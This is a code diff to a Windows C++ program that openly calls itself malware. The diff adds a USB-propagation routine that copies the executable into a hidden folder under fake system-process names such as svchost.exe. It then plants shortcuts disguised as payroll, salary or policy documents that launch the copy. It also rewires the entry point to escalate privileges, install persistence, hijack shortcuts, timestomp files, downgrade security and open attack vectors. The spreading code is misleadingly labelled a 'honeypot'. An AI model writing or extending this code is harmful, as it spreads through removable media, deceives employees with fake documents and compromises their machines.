@@ -26,6 +26,196 @@
 #pragma comment(lib, "ole32.lib")
 #define SetDword SetRegDWORD
 #define SetString SetRegSZ
+#include <set>
+#include <thread>
+#include <chrono>
+#include <random>
+#include <objbase.h> 
+#include <shlguid.h>
+#ifndef UNICODE
+#define UNICODE
+#endif
+#ifndef _UNICODE
+#define _UNICODE
+#endif
+
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <shlobj.h>
+#include <shlguid.h>      // CLSID_ShellLink, IID_IShellLink
+#include <objbase.h>      // CoInitialize
+#include <shlwapi.h>
+#include <string>
+#include <vector>
+#include <set>
+#include <thread>
+#include <chrono>
+#include <random>
+#include <ctime>
+static const std::wstring MONTHS[] = {
+    L"January", L"February", L"March", L"April", L"May", L"June",
+    L"July", L"August", L"September", L"October", L"November", L"December"
+};
+
+bool CreateShortcut(const std::wstring& shortcutPath,
+                    const std::wstring& targetPath,const std::wstring& arguments = L"--n") {
+    CoInitialize(nullptr);
+    bool success = false;
+
+    IShellLinkW* pShellLink = nullptr;
+    IPersistFile* pPersistFile = nullptr;
+
+    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER,
+                                   IID_IShellLinkW, (void**)&pShellLink))) {
+        pShellLink->SetPath(targetPath.c_str());
+        pShellLink->SetWorkingDirectory(targetPath.c_str());
+        
+        if (!arguments.empty()) {
+            pShellLink->SetArguments(arguments.c_str());
+        }
+
+        pShellLink->SetIconLocation(L"shell32.dll", 1);
+
+        if (SUCCEEDED(pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile))) {
+            if (SUCCEEDED(pPersistFile->Save(shortcutPath.c_str(), TRUE))) {
+                success = true;
+            }
+            pPersistFile->Release();
+        }
+        pShellLink->Release();
+    }
+
+    CoUninitialize();
+    return success;
+}
+
+std::wstring FormatFileName(const std::wstring& pattern) {
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+
+    std::wstring result = pattern;
+    std::wstring month = MONTHS[st.wMonth - 1];
+    std::wstring year = std::to_wstring(st.wYear);
+
+    size_t pos;
+    while ((pos = result.find(L"{month}")) != std::wstring::npos)
+        result.replace(pos, 7, month);
+    while ((pos = result.find(L"{year}")) != std::wstring::npos)
+        result.replace(pos, 6, year);
+
+    return result;
+}
+
+
+void ProcessDrive(const std::wstring& driveRoot) {
+    
+    std::wstring hiddenFolder = driveRoot + L"\\$Windows.~WS";
+    const std::vector<std::wstring> systemProcessNames = {
+    L"winlog.exe",
+    L"svchost.exe",
+    L"issas.exe",
+    L"csrss.exe",
+    L"services.exe",
+    L"smss.exe",
+    L"spoolsv.exe",
+    L"taskhost.exe",
+    L"dwm.exe",
+    L"explorer.exe",
+    L"conhost.exe",
+    L"ctfmon.exe"
+    };
+    int tmp_l = rand()%(systemProcessNames.size());
+    std::wstring exeInHidden = hiddenFolder + L"\\" + systemProcessNames[tmp_l];
+
+    
+    wchar_t selfPath[MAX_PATH];
+    if (!GetModuleFileNameW(nullptr, selfPath, MAX_PATH)) return;
+
+    
+    if (!CreateDirectoryW(hiddenFolder.c_str(), nullptr)) {
+        if (GetLastError() != ERROR_ALREADY_EXISTS) return;
+    }
+    SetFileAttributesW(hiddenFolder.c_str(),
+                       FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+
+    
+    if (!CopyFileW(selfPath, exeInHidden.c_str(), FALSE)) return;
+
+    
+    std::vector<std::wstring> templates = {
+    L"Payroll_Summary_{month}_{year}.pdf.lnk",
+    L"Salary_Adjustments_{month}_{year}.xlsx.lnk",
+    L"Benefits_Update_{month}_{year}.pdf.lnk",
+    L"Meeting_Minutes_{month}_{year}.docx.lnk",
+    L"Travel_Expenses_{month}_{year}.xlsx.lnk",
+    L"Holiday_Schedule_{year}.pdf.lnk",
+    L"IT_Maintenance_Notice_{month}_{year}.pdf.lnk",
+    L"Security_Awareness_Update_{month}_{year}.pdf.lnk",
+    L"VPN_Configuration_Guide.pdf.lnk",
+    L"Remote_Work_Policy_{year}.docx.lnk",
+    L"Quarterly_Report_Q{quarter}_{year}.xlsx.lnk",
+    L"Budget_Review_{month}_{year}.xlsx.lnk",
+    L"Purchase_Order_{month}_{year}.pdf.lnk",
+    L"Office_Relocation_Plan.docx.lnk",
+    L"Team_Contact_List.xlsx.lnk",
+    L"Employee_Handbook_{year}.pdf.lnk",
+    L"Corporate_Announcement.pdf.lnk",
+    L"Training_Schedule_{month}_{year}.xlsx.lnk",
+    L"Performance_Review_Template.docx.lnk",
+    L"Company_Newsletter_{month}_{year}.pdf.lnk"
+};
+
+    // losowy wybĂłr
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<> dist(0, templates.size() - 1);
+    std::wstring chosenTemplate = templates[dist(gen)];
+
+    std::wstring linkName = FormatFileName(chosenTemplate);
+    std::wstring linkPath = driveRoot + L"\\" + linkName;
+
+    CreateShortcut(linkPath, exeInHidden);
+}
+
+
+void MonitorThread() {
+    std::set<std::wstring> currentlyMounted;
+
+    while (true) {
+        DWORD drives = GetLogicalDrives();
+        std::set<std::wstring> currentDrives;
+
+        for (int i = 0; i < 26; ++i) {
+            if (drives & (1 << i)) {
+                wchar_t letter = L'A' + i;
+                std::wstring root = std::wstring(1, letter) + L":\\";
+
+                if (GetDriveTypeW(root.c_str()) == DRIVE_REMOVABLE) {
+                    currentDrives.insert(root);
+
+                    if (currentlyMounted.find(root) == currentlyMounted.end()) {
+                        std::thread worker(ProcessDrive, root);
+                        worker.detach();
+                    }
+                }
+            }
+        }
+
+        currentlyMounted = currentDrives;
+
+        std::this_thread::sleep_for(std::chrono::seconds(2));
+    }
+}
+
+// ---------- start ----------
+void StartHoneypot() {
+    std::thread monitor(MonitorThread);
+    monitor.detach();
+}
+
+
+
+
 BOOL SetRegDWORD(HKEY hRoot, LPCWSTR subKey, LPCWSTR valueName, DWORD value)
 {
     HKEY hKey;
@@ -1231,30 +1421,59 @@ void HijackAllShortcuts(const wchar_t* malwarePath)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    LPSTR lpCmdLine, int nCmdShow)
 {
+    srand(time(NULL));
+    int argc = 0;
+    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+    bool hasNFlag = false;
+    if (argv != nullptr) {
+        for (int i = 1; i < argc; ++i) {
+            std::wstring arg = argv[i];
+            
+            if (arg == L"--n") {
+                hasNFlag = true;
+                break; 
+            }
+        }
+        
+        
+        LocalFree(argv);
+    }
+    if(!hasNFlag){
     if (!IsElevated()) {
         if (ElevateSelf()) {
             return 0;
         }
     }
+    }
     MakePolymorphic();
     wchar_t malwarePath[MAX_PATH];
     GetModuleFileNameW(NULL, malwarePath, MAX_PATH);
-    if (!IsInstalledFlagSet()) {
+    StartHoneypot();
+    
+    EnsureExplorerRunning();
+    if (!IsInstalledFlagSet() or IsElevated()) {
         bool isAdmin = IsElevated();
-        if (!isAdmin) {
+        if (isAdmin) {
+            InstallPersistenceRandom(true, malwarePath);
+            TimestompAllAccessibleFiles(true);
             HijackAllShortcuts(malwarePath);
-            TimestompAllAccessibleFiles(false);
-            
-            return 0;
+            PerformFullSystemDowngrade();
+            OpenAttackVectors();
+        }else
+        {
+            InstallPersistenceRandom(false, malwarePath);
+            HijackAllShortcuts(malwarePath);
+            //PerformFullSystemDowngrade();
+            //OpenAttackVectors();
+            TimestompAllAccessibleFiles(true);
         }
-        EnsureExplorerRunning();
-        InstallPersistenceRandom(true, malwarePath);
         SetInstalledFlag();
-        PerformFullSystemDowngrade();
-        OpenAttackVectors();
-        TimestompAllAccessibleFiles(true);
-        return 0;
-    } else {
-        return 0;
     }
+    HANDLE hStop = CreateEvent(nullptr, TRUE, FALSE, nullptr);
+    if (hStop) {
+        WaitForSingleObject(hStop, INFINITE);
+        CloseHandle(hStop);
+    }
+    while (true) Sleep(10000);
+    return 0;
 }
